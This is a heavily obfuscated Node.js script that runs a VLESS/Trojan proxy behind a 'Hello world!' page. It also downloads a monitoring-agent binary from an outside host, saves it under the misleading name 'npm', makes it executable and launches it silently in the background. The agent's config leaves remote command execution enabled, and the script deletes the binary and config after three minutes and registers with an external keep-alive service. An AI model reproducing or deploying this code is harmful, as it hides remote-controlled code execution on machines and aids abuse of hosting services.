const _0x50bc2e=_0x53f8;(function(_0x35a722,_0xf3a028){const _0x25e3de=_0x53f8,_0x5f05f3=_0x35a722();while(!![]){try{const _0x276025=parseInt(_0x25e3de(0x15e))/0x1*(parseInt(_0x25e3de(0x1aa))/0x2)+-parseInt(_0x25e3de(0x140))/0x3+parseInt(_0x25e3de(0x17a))/0x4*(parseInt(_0x25e3de(0x152))/0x5)+-parseInt(_0x25e3de(0x166))/0x6*(-parseInt(_0x25e3de(0x12b))/0x7)+-parseInt(_0x25e3de(0x18c))/0x8+parseInt(_0x25e3de(0x18d))/0x9*(-parseInt(_0x25e3de(0x19b))/0xa)+parseInt(_0x25e3de(0x143))/0xb;if(_0x276025===_0xf3a028)break;else _0x5f05f3['push'](_0x5f05f3['shift']());}catch(_0x2fbc76){_0x5f05f3['push'](_0x5f05f3['shift']());}}}(_0xefad,0xbba8f));const os=require('os'),http=require(_0x50bc2e(0x193)),fs=require('fs'),axios=require(_0x50bc2e(0x132)),net=require(_0x50bc2e(0x183)),path=require(_0x50bc2e(0x157)),crypto=require(_0x50bc2e(0x14e)),{Buffer}=require(_0x50bc2e(0x154)),{exec,execSync}=require(_0x50bc2e(0x16b)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process['env']['UUID']||_0x50bc2e(0x195),NEZHA_SERVER=process[_0x50bc2e(0x137)][_0x50bc2e(0x170)]||'',NEZHA_PORT=process[_0x50bc2e(0x137)][_0x50bc2e(0x14f)]||'',NEZHA_KEY=process[_0x50bc2e(0x137)]['NEZHA_KEY']||'',DOMAIN=process[_0x50bc2e(0x137)][_0x50bc2e(0x142)]||_0x50bc2e(0x148),AUTO_ACCESS=process[_0x50bc2e(0x137)][_0x50bc2e(0x146)]||![],WSPATH=process[_0x50bc2e(0x137)][_0x50bc2e(0x12f)]||UUID[_0x50bc2e(0x134)](0x0,0x8),SUB_PATH=process[_0x50bc2e(0x137)][_0x50bc2e(0x186)]||'sub',NAME=process['env'][_0x50bc2e(0x17b)]||'',PORT=process[_0x50bc2e(0x137)][_0x50bc2e(0x14a)]||0xbb8;let ISP='';const GetISP=async()=>{const _0x107d09=_0x50bc2e;try{const _0xce1e27=await axios['get'](_0x107d09(0x15c)),_0x18e013=_0xce1e27[_0x107d09(0x1a2)];ISP=(_0x18e013[_0x107d09(0x12e)]+'-'+_0x18e013[_0x107d09(0x1a3)])[_0x107d09(0x1a6)](/ /g,'_');}catch(_0x4abf9d){ISP='Unknown';}};GetISP();const httpServer=http[_0x50bc2e(0x159)]((_0x59998e,_0x312969)=>{const _0x4fcc8d=_0x50bc2e;if(_0x59998e[_0x4fcc8d(0x12a)]==='/'){const _0x8452ca=path[_0x4fcc8d(0x16c)](__dirname,_0x4fcc8d(0x168));fs['readFile'](_0x8452ca,'utf8',(_0x5e7c74,_0x375e20)=>{const _0x205a7b=_0x4fcc8d;if(_0x5e7c74){_0x312969[_0x205a7b(0x181)](0xc8,{'Content-Type':'text/html'}),_0x312969[_0x205a7b(0x162)](_0x205a7b(0x151));return;}_0x312969[_0x205a7b(0x181)](0xc8,{'Content-Type':_0x205a7b(0x174)}),_0x312969['end'](_0x375e20);});return;}else{if(_0x59998e['url']==='/'+SUB_PATH){const _0x1b8ee1=NAME?NAME+'-'+ISP:ISP,_0x25148f=_0x4fcc8d(0x188)+UUID+_0x4fcc8d(0x17f)+DOMAIN+_0x4fcc8d(0x13d)+DOMAIN+_0x4fcc8d(0x16d)+WSPATH+'#'+_0x1b8ee1,_0x4e52a9=_0x4fcc8d(0x187)+UUID+_0x4fcc8d(0x12c)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+'&path=%2F'+WSPATH+'#'+_0x1b8ee1,_0x5c786d=_0x25148f+'\x0a'+_0x4e52a9,_0x3527c6=Buffer[_0x4fcc8d(0x1a1)](_0x5c786d)[_0x4fcc8d(0x180)]('base64');_0x312969[_0x4fcc8d(0x181)](0xc8,{'Content-Type':_0x4fcc8d(0x155)}),_0x312969[_0x4fcc8d(0x162)](_0x3527c6+'\x0a');}else _0x312969[_0x4fcc8d(0x181)](0x194,{'Content-Type':_0x4fcc8d(0x155)}),_0x312969[_0x4fcc8d(0x162)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x50bc2e(0x150))]({'server':httpServer}),uuid=UUID[_0x50bc2e(0x1a6)](/-/g,''),DNS_SERVERS=[_0x50bc2e(0x161),_0x50bc2e(0x138)];function resolveHost(_0x29f0eb){return new Promise((_0x71b577,_0x12eb63)=>{const _0x5f2e26=_0x53f8;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x5f2e26(0x1a8)](_0x29f0eb)){_0x71b577(_0x29f0eb);return;}let _0x43d3df=0x0;function _0x54f7ec(){const _0x1b55dd=_0x5f2e26;if(_0x43d3df>=DNS_SERVERS[_0x1b55dd(0x139)]){_0x12eb63(new Error(_0x1b55dd(0x14d)+_0x29f0eb+_0x1b55dd(0x177)));return;}const _0x34431c=DNS_SERVERS[_0x43d3df];_0x43d3df++;const _0x48257e=_0x1b55dd(0x147)+encodeURIComponent(_0x29f0eb)+_0x1b55dd(0x175);axios[_0x1b55dd(0x169)](_0x48257e,{'timeout':0x1388,'headers':{'Accept':_0x1b55dd(0x172)}})[_0x1b55dd(0x135)](_0x4144d8=>{const _0x1406dc=_0x1b55dd,_0x607dc8=_0x4144d8[_0x1406dc(0x1a2)];if(_0x607dc8[_0x1406dc(0x16a)]===0x0&&_0x607dc8[_0x1406dc(0x184)]&&_0x607dc8['Answer'][_0x1406dc(0x139)]>0x0){const _0x308192=_0x607dc8[_0x1406dc(0x184)][_0x1406dc(0x176)](_0x298a8b=>_0x298a8b[_0x1406dc(0x19f)]===0x1);if(_0x308192){_0x71b577(_0x308192[_0x1406dc(0x1a2)]);return;}}_0x54f7ec();})[_0x1b55dd(0x189)](_0x20654f=>{_0x54f7ec();});}_0x54f7ec();});}function handleVlessConnection(_0x34910d,_0x26ffd1){const _0x573504=_0x50bc2e,[_0x593752]=_0x26ffd1,_0x4b9d5c=_0x26ffd1[_0x573504(0x134)](0x1,0x11);if(!_0x4b9d5c[_0x573504(0x18e)]((_0x51bde9,_0x9fd996)=>_0x51bde9==parseInt(uuid[_0x573504(0x13e)](_0x9fd996*0x2,0x2),0x10)))return![];let _0x10fd64=_0x26ffd1[_0x573504(0x134)](0x11,0x12)[_0x573504(0x1a5)]()+0x13;const _0x58f489=_0x26ffd1[_0x573504(0x134)](_0x10fd64,_0x10fd64+=0x2)[_0x573504(0x158)](0x0),_0x4a26d4=_0x26ffd1['slice'](_0x10fd64,_0x10fd64+=0x1)[_0x573504(0x1a5)](),_0x47398e=_0x4a26d4==0x1?_0x26ffd1[_0x573504(0x134)](_0x10fd64,_0x10fd64+=0x4)['join']('.'):_0x4a26d4==0x2?new TextDecoder()[_0x573504(0x130)](_0x26ffd1['slice'](_0x10fd64+0x1,_0x10fd64+=0x1+_0x26ffd1[_0x573504(0x134)](_0x10fd64,_0x10fd64+0x1)[_0x573504(0x1a5)]())):_0x4a26d4==0x3?_0x26ffd1[_0x573504(0x134)](_0x10fd64,_0x10fd64+=0x10)[_0x573504(0x133)]((_0x25c88c,_0x7761e8,_0xe466c2,_0x3a5649)=>_0xe466c2%0x2?_0x25c88c['concat'](_0x3a5649[_0x573504(0x134)](_0xe466c2-0x1,_0xe466c2+0x1)):_0x25c88c,[])[_0x573504(0x17e)](_0x27f7ae=>_0x27f7ae['readUInt16BE'](0x0)[_0x573504(0x180)](0x10))[_0x573504(0x16c)](':'):'';_0x34910d[_0x573504(0x17d)](new Uint8Array([_0x593752,0x0]));const _0x3ff95f=createWebSocketStream(_0x34910d);return resolveHost(_0x47398e)[_0x573504(0x135)](_0x136331=>{const _0x225c6d=_0x573504;net[_0x225c6d(0x19c)]({'host':_0x136331,'port':_0x58f489},function(){const _0x576660=_0x225c6d;this['write'](_0x26ffd1[_0x576660(0x134)](_0x10fd64)),_0x3ff95f['on'](_0x576660(0x190),()=>{})[_0x576660(0x145)](this)['on'](_0x576660(0x190),()=>{})[_0x576660(0x145)](_0x3ff95f);})['on'](_0x225c6d(0x190),()=>{});})[_0x573504(0x189)](_0x143f4c=>{const _0x3b9bb5=_0x573504;net[_0x3b9bb5(0x19c)]({'host':_0x47398e,'port':_0x58f489},function(){const _0x5391d2=_0x3b9bb5;this['write'](_0x26ffd1[_0x5391d2(0x134)](_0x10fd64)),_0x3ff95f['on']('error',()=>{})[_0x5391d2(0x145)](this)['on'](_0x5391d2(0x190),()=>{})[_0x5391d2(0x145)](_0x3ff95f);})['on'](_0x3b9bb5(0x190),()=>{});}),!![];}function handleTrojanConnection(_0x396cc0,_0x5e4d1d){const _0x20d76f=_0x50bc2e;try{if(_0x5e4d1d['length']<0x3a)return![];const _0x4a5426=_0x5e4d1d[_0x20d76f(0x134)](0x0,0x38)['toString'](),_0x3dc88d=[UUID];let _0x942ba0=null;for(const _0x45f9dd of _0x3dc88d){const _0x3f1add=crypto['createHash'](_0x20d76f(0x160))[_0x20d76f(0x164)](_0x45f9dd)[_0x20d76f(0x198)]('hex');if(_0x3f1add===_0x4a5426){_0x942ba0=_0x45f9dd;break;}}if(!_0x942ba0)return![];let _0x5588cd=0x38;_0x5e4d1d[_0x5588cd]===0xd&&_0x5e4d1d[_0x5588cd+0x1]===0xa&&(_0x5588cd+=0x2);const _0x9f67ce=_0x5e4d1d[_0x5588cd];if(_0x9f67ce!==0x1)return![];_0x5588cd+=0x1;const _0x49017e=_0x5e4d1d[_0x5588cd];_0x5588cd+=0x1;let _0x4cb2b4,_0x347498;if(_0x49017e===0x1)_0x4cb2b4=_0x5e4d1d[_0x20d76f(0x134)](_0x5588cd,_0x5588cd+0x4)['join']('.'),_0x5588cd+=0x4;else{if(_0x49017e===0x3){const _0x5bb020=_0x5e4d1d[_0x5588cd];_0x5588cd+=0x1,_0x4cb2b4=_0x5e4d1d[_0x20d76f(0x134)](_0x5588cd,_0x5588cd+_0x5bb020)[_0x20d76f(0x180)](),_0x5588cd+=_0x5bb020;}else{if(_0x49017e===0x4)_0x4cb2b4=_0x5e4d1d['slice'](_0x5588cd,_0x5588cd+0x10)[_0x20d76f(0x133)]((_0x2aa922,_0x54e2bc,_0x1cd66b,_0x8997ac)=>_0x1cd66b%0x2?_0x2aa922[_0x20d76f(0x144)](_0x8997ac[_0x20d76f(0x134)](_0x1cd66b-0x1,_0x1cd66b+0x1)):_0x2aa922,[])['map'](_0x5e31ef=>_0x5e31ef[_0x20d76f(0x158)](0x0)[_0x20d76f(0x180)](0x10))[_0x20d76f(0x16c)](':'),_0x5588cd+=0x10;else return![];}}_0x347498=_0x5e4d1d[_0x20d76f(0x158)](_0x5588cd),_0x5588cd+=0x2;_0x5588cd<_0x5e4d1d[_0x20d76f(0x139)]&&_0x5e4d1d[_0x5588cd]===0xd&&_0x5e4d1d[_0x5588cd+0x1]===0xa&&(_0x5588cd+=0x2);const _0x31c092=createWebSocketStream(_0x396cc0);return resolveHost(_0x4cb2b4)[_0x20d76f(0x135)](_0x4c88ff=>{const _0x56bac5=_0x20d76f;net[_0x56bac5(0x19c)]({'host':_0x4c88ff,'port':_0x347498},function(){const _0x183fb8=_0x56bac5;_0x5588cd<_0x5e4d1d[_0x183fb8(0x139)]&&this[_0x183fb8(0x163)](_0x5e4d1d['slice'](_0x5588cd)),_0x31c092['on'](_0x183fb8(0x190),()=>{})['pipe'](this)['on'](_0x183fb8(0x190),()=>{})['pipe'](_0x31c092);})['on']('error',()=>{});})['catch'](_0xe1ec4a=>{const _0x28d66b=_0x20d76f;net['connect']({'host':_0x4cb2b4,'port':_0x347498},function(){const _0x5be4e6=_0x53f8;_0x5588cd<_0x5e4d1d[_0x5be4e6(0x139)]&&this['write'](_0x5e4d1d[_0x5be4e6(0x134)](_0x5588cd)),_0x31c092['on']('error',()=>{})[_0x5be4e6(0x145)](this)['on'](_0x5be4e6(0x190),()=>{})[_0x5be4e6(0x145)](_0x31c092);})['on'](_0x28d66b(0x190),()=>{});}),!![];}catch(_0x2bccec){return![];}}function _0xefad(){const _0x1f8508=['25901414UBzNXa','concat','pipe','AUTO_ACCESS','https://dns.google/resolve?name=','1234.abc.com','chmod\x20+x\x20npm','PORT','pop','once','Failed\x20to\x20resolve\x20','crypto','NEZHA_PORT','Server','Hello\x20world!','279385BQVEUC','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','buffer','text/plain','error:\x20','path','readUInt16BE','createServer','includes','\x20-p\x20','https://speed.cloudflare.com/meta','unlink','14pOhYmX','aarch64','sha224','8.8.4.4','end','write','update','2087','282SYoHmj','post','index.html','get','Status','child_process','join','&path=%2F','2083','arch','NEZHA_SERVER','application/json','application/dns-json','/bin/bash','text/html','&type=A','find','\x20with\x20all\x20DNS\x20servers','finish','stream','36eCQGfr','NAME','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','send','map','@cdns.doon.eu.org:443?encryption=none&security=tls&sni=','toString','writeHead','https://arm64.ssss.nyc.mn/agent','net','Answer','close','SUB_PATH','trojan://','vless://','catch','utf-8','config.yaml','11186528ZzoNJN','36171MvVsKC','every','setsid\x20nohup\x20./npm\x20-s\x20','error','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','https://amd64.ssss.nyc.mn/agent','http','createWriteStream','4ac83aa4-c155-11f0-8de9-0242ac120002','message','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','digest','npm\x20is\x20running','writeFileSync','2120YxuXam','connect','--tls','2053','type','npm\x20running\x20error:','from','data','asOrganization','client_secret:\x20','readUInt8','replace','Server\x20is\x20running\x20on\x20port\x20','test','log','72730rNxQez','url','176162EXYyeQ','@cdns.doon.eu.org:443?security=tls&sni=','2096','country','WSPATH','decode','true','axios','reduce','slice','then','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','env','1.1.1.1','length','npm','https://','8443','&fp=chrome&type=ws&host=','substr','https://oooo.serv00.net/add-url','4591440ymUTxO','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','DOMAIN'];_0xefad=function(){return _0x1f8508;};return _0xefad();}wss['on']('connection',(_0x1500a7,_0x348f27)=>{const _0x53c47f=_0x50bc2e,_0x1ac32e=_0x348f27[_0x53c47f(0x12a)]||'';_0x1500a7[_0x53c47f(0x14c)](_0x53c47f(0x196),_0x29d86e=>{const _0x2a2a79=_0x53c47f;if(_0x29d86e['length']>0x11&&_0x29d86e[0x0]===0x0){const _0x348246=_0x29d86e[_0x2a2a79(0x134)](0x1,0x11),_0x345406=_0x348246['every']((_0x53f401,_0x1b1f66)=>_0x53f401==parseInt(uuid[_0x2a2a79(0x13e)](_0x1b1f66*0x2,0x2),0x10));if(_0x345406){!handleVlessConnection(_0x1500a7,_0x29d86e)&&_0x1500a7[_0x2a2a79(0x185)]();return;}}!handleTrojanConnection(_0x1500a7,_0x29d86e)&&_0x1500a7[_0x2a2a79(0x185)]();})['on'](_0x53c47f(0x190),()=>{});});const getDownloadUrl=()=>{const _0x2de05d=_0x50bc2e,_0x27afae=os[_0x2de05d(0x16f)]();return _0x27afae==='arm'||_0x27afae==='arm64'||_0x27afae===_0x2de05d(0x15f)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0x2de05d(0x182):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x2de05d(0x192);},downloadFile=async()=>{const _0x107e46=_0x50bc2e;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x454ccb=getDownloadUrl(),_0x23ef7e=await axios({'method':_0x107e46(0x169),'url':_0x454ccb,'responseType':_0x107e46(0x179)}),_0x2b7975=fs[_0x107e46(0x194)](_0x107e46(0x13a));return _0x23ef7e['data'][_0x107e46(0x145)](_0x2b7975),new Promise((_0x539853,_0x3a9d6f)=>{const _0x55b5ab=_0x107e46;_0x2b7975['on'](_0x55b5ab(0x178),()=>{const _0x204bc8=_0x55b5ab;console['log']('npm\x20download\x20successfully'),exec(_0x204bc8(0x149),_0x2afb16=>{if(_0x2afb16)_0x3a9d6f(_0x2afb16);_0x539853();});}),_0x2b7975['on'](_0x55b5ab(0x190),_0x3a9d6f);});}catch(_0x37823e){throw _0x37823e;}},runnz=async()=>{const _0x53bb5b=_0x50bc2e;try{const _0x43c0df=execSync(_0x53bb5b(0x136),{'encoding':_0x53bb5b(0x18a)});if(_0x43c0df['trim']()!==''){console[_0x53bb5b(0x1a9)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x2b63b2){}await downloadFile();let _0x2c9fdb='',_0x51caba=['443',_0x53bb5b(0x13c),_0x53bb5b(0x12d),_0x53bb5b(0x165),_0x53bb5b(0x16e),_0x53bb5b(0x19e)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4d18c0=_0x51caba[_0x53bb5b(0x15a)](NEZHA_PORT)?_0x53bb5b(0x19d):'';_0x2c9fdb=_0x53bb5b(0x18f)+NEZHA_SERVER+':'+NEZHA_PORT+_0x53bb5b(0x15b)+NEZHA_KEY+'\x20'+_0x4d18c0+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xa70132=NEZHA_SERVER[_0x53bb5b(0x15a)](':')?NEZHA_SERVER['split'](':')[_0x53bb5b(0x14b)]():'',_0x1cf2f5=_0x51caba['includes'](_0xa70132)?_0x53bb5b(0x131):'false',_0x1568f7=_0x53bb5b(0x1a4)+NEZHA_KEY+_0x53bb5b(0x141)+NEZHA_SERVER+_0x53bb5b(0x197)+_0x1cf2f5+_0x53bb5b(0x153)+UUID;fs[_0x53bb5b(0x19a)](_0x53bb5b(0x18b),_0x1568f7);}_0x2c9fdb=_0x53bb5b(0x17c);}else{console[_0x53bb5b(0x1a9)](_0x53bb5b(0x191));return;}}try{exec(_0x2c9fdb,{'shell':_0x53bb5b(0x173)},_0x3ce6cd=>{const _0x47e92f=_0x53bb5b;if(_0x3ce6cd)console['error'](_0x47e92f(0x1a0),_0x3ce6cd);else console[_0x47e92f(0x1a9)](_0x47e92f(0x199));});}catch(_0x33c1d9){console[_0x53bb5b(0x190)](_0x53bb5b(0x156)+_0x33c1d9);}};async function addAccessTask(){const _0x5909a2=_0x50bc2e;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x1b4341=_0x5909a2(0x13b)+DOMAIN+'/'+SUB_PATH;try{const _0x55536f=await axios[_0x5909a2(0x167)](_0x5909a2(0x13f),{'url':_0x1b4341},{'headers':{'Content-Type':_0x5909a2(0x171)}});console[_0x5909a2(0x1a9)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x2bb599){}}const delFiles=()=>{const _0x186ca5=_0x50bc2e;fs[_0x186ca5(0x15d)]('npm',()=>{}),fs[_0x186ca5(0x15d)](_0x186ca5(0x18b),()=>{});};function _0x53f8(_0x3103a6,_0x4fb7dd){const _0xefadc=_0xefad();return _0x53f8=function(_0x53f8b7,_0x2a723a){_0x53f8b7=_0x53f8b7-0x12a;let _0x39ff74=_0xefadc[_0x53f8b7];return _0x39ff74;},_0x53f8(_0x3103a6,_0x4fb7dd);}httpServer['listen'](PORT,()=>{const _0x2dea1e=_0x50bc2e;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x2dea1e(0x1a9)](_0x2dea1e(0x1a7)+PORT);});
